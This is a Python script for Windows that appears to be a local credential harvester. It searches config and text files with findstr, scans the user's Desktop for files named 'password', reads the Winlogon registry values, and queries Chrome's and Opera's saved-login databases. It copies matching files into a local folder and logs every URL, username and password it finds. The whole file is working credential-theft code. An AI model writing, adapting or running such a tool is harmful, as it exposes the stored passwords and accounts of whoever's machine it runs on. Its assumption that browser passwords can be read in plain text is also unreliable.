import os
import sqlite3
import winreg
import shutil
import colorlog

# Configure colorlog
logger = colorlog.getLogger()
logger.setLevel(colorlog.INFO)  # Set the log level
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)


def copy_file(src_path, dest_dir):
    try:
        src_path = str(src_path)
        dest_dir = str(dest_dir)
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        dest_path = os.path.join(dest_dir, os.path.basename(src_path))
        shutil.copy2(src_path, dest_path)
        logger.info(f"Copied file to: {dest_path}")
    except Exception as e:
        logger.error(f"Error: {e}")


def search_filesystem():
    logger.info("Searching the file system for passwords...")
    extensions = ['*.xml', '*.ini', '*.txt']
    for ext in extensions:
        for line in os.popen(f'findstr /si password {ext}'):
            parts = line.strip().split(':', 1)
            if len(parts) > 1:
                file_path = parts[0].strip()
                logger.info(f"Found password in file: {file_path}")
                copy_file(file_path, "DATA/found_passwords")


def search_desktop():
    logger.info("Searching the desktop for password files...")
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    for file in os.listdir(desktop_path):
        if "password" in file.lower():
            file_path = os.path.join(desktop_path, file)
            logger.info(f"Found password file on desktop: {file_path}")
            copy_file(file_path, "DATA/found_passwords")


def search_registry():
    logger.info("Searching the registry for passwords...")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
        i = 0
        while True:
            try:
                value = winreg.EnumValue(key, i)
                if "password" in value[0].lower():
                    logger.info(f"Found password in registry: {value[0]} = {value[1]}")
                i += 1
            except OSError:
                break
    except OSError:
        logger.warning("Registry search failed.")


def search_google():
    logger.info("Searching for stored passwords in browsers...")
    chrome_login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Google", "Chrome", "User Data",
                                          "Default", "Login Data")

    if not os.path.exists(chrome_login_data_path):
        logger.warning(
            "Chrome Login Data file not found. Is Chrome installed and the 'Encrypt passwords' feature disabled?")
        return

    try:
        conn = sqlite3.connect(chrome_login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        if results:
            for result in results:
                logger.info(
                    f"Found password in Chrome: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
        else:
            logger.warning("No passwords found in Chrome.")
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Error accessing Chrome Login Data: {e}")


def search_opera():
    logger.info("Searching for stored passwords in Opera...")
    opera_login_data_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Opera Software",
                                         "Opera Stable", "Login Data")

    if not os.path.exists(opera_login_data_path):
        logger.warning(
            "Opera Login Data file not found. Is Opera installed and the 'Encrypt passwords' feature disabled?")
        return

    try:
        conn = sqlite3.connect(opera_login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        results = cursor.fetchall()

        if results:
            for result in results:
                logger.info(
                    f"Found password in Opera: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
        else:
            logger.warning("No passwords found in Opera.")
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Error accessing Opera Login Data: {e}")


def main():
    search_registry()
    search_filesystem()
    search_desktop()
    search_google()
    search_opera()


if __name__ == "__main__":
    main()
